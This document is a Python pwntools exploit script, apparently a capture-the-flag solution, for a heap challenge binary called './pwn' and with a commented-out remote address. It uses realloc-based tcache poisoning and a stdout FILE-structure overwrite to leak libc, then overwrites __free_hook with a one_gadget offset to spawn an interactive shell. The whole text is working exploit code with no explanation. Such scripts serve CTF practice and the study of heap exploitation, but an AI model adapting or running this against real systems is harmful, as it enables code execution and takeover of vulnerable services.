from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# context.log_level = "debug"
elf = ELF("./pwn")
p = process("./pwn")
# p = remote("39.97.182.233", 31881)


def re(size, content):
	p.recvuntil(">> ")
	p.sendline("1")
	p.recvuntil("Size?\n")
	p.sendline(str(size))
	p.recvuntil("Content?\n")
	p.send(content)

def free():
	p.recvuntil(">> ")
	p.sendline("2")

def ba():
	p.recvuntil(">> ")
	p.sendline("666")

re(0x70,'a'+"\x00") # 0
re(0x0,'')
re(0x100,'a'+"\x00") # 1
re(0x0,'')
re(0xe0,'a'+"\x00") # 2
re(0x0,'')
re(0x100,'a'+"\x00") # 3

for i in range(7):
	free()
re(0x0,"") 


re(0x70,'a'+"\x00") # malloc to 0

re(0x180, chr(0) * 0x78 + p64(0x41) + "\x60\x57")
re(0x0, "") 

re(0x100,"a"+"\x00")
re(0x0, "")

re(0x100,p64(0xfbad1887) + p64(0) * 3 + "\x00")

libc_base = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 0x3ed8b0

p.recvuntil(">> ")
p.sendline("666")


re(0x70,'a')
re(0x0,'')
re(0x110,'a')
re(0x0,'')
re(0xf0,'a')
re(0x0,'')
re(0x110,'a')

for i in range(7):
	free()
re(0x0,'')
re(0x70,'a')

re(0x190,chr(0) * 0x78 + p64(0x41) + p64(libc_base + libc.symbols['__free_hook'])) 
re(0x0,'')
 
re(0x110,'a') 
re(0x0,'')

one_shot = libc_base + 0x4f322
re(0x110,p64(one_shot))


p.sendline("2")
p.interactive()

